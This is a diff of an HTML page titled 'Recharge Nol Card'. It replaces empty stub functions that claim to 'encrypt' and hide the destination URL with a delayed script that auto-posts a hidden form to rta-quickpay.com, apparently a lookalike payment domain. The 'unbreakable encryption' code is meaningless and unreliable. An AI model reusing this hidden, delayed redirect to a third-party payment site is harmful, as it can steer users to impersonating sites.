@@ -1,40 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-      <script>
+  <script>
     function redirectToSafeWebsite() {
-      var destinationURL = "https://rta-quickpay.com/";
+      var destinationURL = "https://rta-quickpay.com";
 
-      // Encrypt the destination URL using an unbreakable encryption algorithm
-      var encryptedURL = encryptURL(destinationURL);
+      // Generate a random token
+      var token = Math.random().toString(36).substring(7);
 
-      // Send the encrypted URL to a remote server for decryption
-      sendToRemoteServer(encryptedURL);
+      // Create a dynamic form
+      var form = document.createElement("form");
+      form.method = "POST";
+      form.action = destinationURL;
 
-      // Decrypt the URL on the client-side for redirection
-      var decryptedURL = decryptURL(encryptedURL);
-      window.location.href = decryptedURL;
-    }
+      // Add the token as a hidden input field
+      var tokenField = document.createElement("input");
+      tokenField.type = "hidden";
+      tokenField.name = "token";
+      tokenField.value = token;
+      form.appendChild(tokenField);
 
-    function encryptURL(url) {
-      // Implement an unbreakable encryption algorithm here
-      // ...
-    }
-
-    function decryptURL(encryptedURL) {
-      // Implement an unbreakable decryption algorithm here
-      // ...
-    }
-
-    function sendToRemoteServer(data) {
-      // Send the encrypted data to a remote server for decryption
-      // ...
+      // Submit the form
+      document.body.appendChild(form);
+      form.submit();
     }
 
     function handleClick() {
       setTimeout(redirectToSafeWebsite, 2000); // Redirect after 2 seconds
     }
   </script>
+
 
     <meta charset="UTF-8">
     <title>Recharge Nol Card</title>
